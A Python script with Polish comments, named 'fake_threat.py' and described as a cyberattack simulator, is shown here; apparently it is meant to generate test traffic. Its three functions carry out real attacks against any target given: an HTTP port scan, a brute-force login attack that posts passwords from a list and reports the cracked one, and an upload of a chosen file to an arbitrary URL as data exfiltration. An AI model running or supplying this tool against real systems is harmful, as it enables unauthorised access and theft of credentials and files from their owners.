# fake_threat.py
import requests
import time
import random
import string
import argparse
import logging

def generate_random_string(length=10):
    """Generuje losowy ciąg znaków."""
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

def simulate_port_scan(target_ip, port_range_start, port_range_end, delay=0.1):
    """Symuluje skanowanie portów."""
    logging.info(f"Rozpoczynanie symulacji skanowania portów na {target_ip} (porty {port_range_start}-{port_range_end})...")
    for port in range(port_range_start, port_range_end + 1):
        try:
            # Używamy requests.get z krótkim timeoutem, aby zasymulować szybki "ping"
            response = requests.get(f"http://{target_ip}:{port}", timeout=0.5)
            logging.warning(f"Port {port} na {target_ip} wydaje się być otwarty (status code: {response.status_code}).")

        except requests.exceptions.RequestException as e:
            # Spodziewamy się wielu błędów połączenia - to normalne przy skanowaniu portów.
            logging.debug(f"Port {port} na {target_ip} prawdopodobnie zamknięty lub odfiltrowany ({type(e).__name__}).")
        time.sleep(delay)
    logging.info("Zakończono symulację skanowania portów.")

def simulate_brute_force_login(target_url, username, password_list_file, delay=0.5):
    """Symuluje atak brute-force na formularz logowania."""
    logging.info(f"Rozpoczynanie symulacji ataku brute-force na {target_url} (użytkownik: {username})...")

    try:
        with open(password_list_file, 'r') as f:
            passwords = [line.strip() for line in f]
    except FileNotFoundError:
        logging.error(f"Nie znaleziono pliku z hasłami: {password_list_file}")
        return

    for password in passwords:
        logging.debug(f"Próba logowania z hasłem: {password}")
        try:
            data = {'username': username, 'password': password}
            response = requests.post(target_url, data=data, timeout=5)

            # Dostosuj to do spodziewanej odpowiedzi sukcesu/porażki formularza logowania.
            if "Zalogowano pomyślnie" in response.text:  # Zmień na rzeczywisty komunikat sukcesu
                logging.critical(f"Udało się złamać hasło!  Hasło to: {password}")
                return  # Przerwij po znalezieniu hasła
            elif "Nieprawidłowe hasło" in response.text: # Zmień na rzeczywisty komunikat błędu
                logging.info(f"Nieudana próba z hasłem: {password}")
            else:
                 logging.warning(f"Niespodziewana odpowiedź serwera (status code: {response.status_code}): {response.text}")

        except requests.exceptions.RequestException as e:
            logging.error(f"Błąd podczas próby logowania: {e}")
        time.sleep(delay)

    logging.info("Zakończono symulację ataku brute-force. Hasło nie zostało złamane.")


def simulate_data_exfiltration(target_url, file_to_exfiltrate, delay = 0.2):
    """Symulacja eksfiltracji danych."""
    logging.info(f"Symulacja eksfiltracji pliku '{file_to_exfiltrate}' do {target_url}")
    try:
        with open(file_to_exfiltrate, 'rb') as f:
            files = {'file': (file_to_exfiltrate, f)}
            response = requests.post(target_url, files=files, timeout=10)  # Dłuższy timeout dla uploadu

            if response.status_code == 200:
                logging.critical(f"Eksfiltracja pliku '{file_to_exfiltrate}' powiodła się!")
            else:
                logging.warning(f"Eksfiltracja pliku '{file_to_exfiltrate}' nie powiodła się (status code: {response.status_code}).")

    except FileNotFoundError:
        logging.error(f"Nie znaleziono pliku do eksfiltracji: {file_to_exfiltrate}")
    except requests.exceptions.RequestException as e:
        logging.error(f"Błąd podczas eksfiltracji: {e}")

    time.sleep(delay)


def main():

    parser = argparse.ArgumentParser(description="Symulator różnych typów cyberataków.")
    parser.add_argument('--target', required=True, help="Adres IP lub URL celu ataku.")
    parser.add_argument('--type', required=True, choices=['port_scan', 'brute_force', 'data_exfiltration'],
                        help="Typ ataku do przeprowadzenia.")
    parser.add_argument('--port_start', type=int, default=1, help="Początkowy port do skanowania (dla port_scan).")
    parser.add_argument('--port_end', type=int, default=1024, help="Końcowy port do skanowania (dla port_scan).")
    parser.add_argument('--username', default='admin', help="Nazwa użytkownika do ataku brute-force.")
    parser.add_argument('--password_file', default='passwords.txt',
                        help="Ścieżka do pliku z listą haseł (dla brute_force).")
    parser.add_argument('--exfil_file', default='secret.txt', help="Ścieżka do pliku do eksfiltracji (dla data_exfiltration).")
    parser.add_argument('--delay', type=float, default=0.1, help="Opóźnienie między próbami ataku (w sekundach).")

    args = parser.parse_args()

    # Konfiguracja logowania (można przenieść do osobnego modułu)
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

    if args.type == 'port_scan':
        simulate_port_scan(args.target, args.port_start, args.port_end, args.delay)
    elif args.type == 'brute_force':
         # Upewnij się, że cel jest URL-em (dodaj http:// jeśli brakuje)
        target_url = args.target
        if not target_url.startswith("http://") and not target_url.startswith("https://"):
            target_url = "http://" + target_url
        simulate_brute_force_login(target_url, args.username, args.password_file, args.delay)
    elif args.type == 'data_exfiltration':
        # Upewnij się, że cel jest URL-em
        target_url = args.target
        if not target_url.startswith("http://") and not target_url.startswith("https://"):
            target_url = "http://" + target_url
        simulate_data_exfiltration(target_url, args.exfil_file, args.delay)


if __name__ == "__main__":
    main()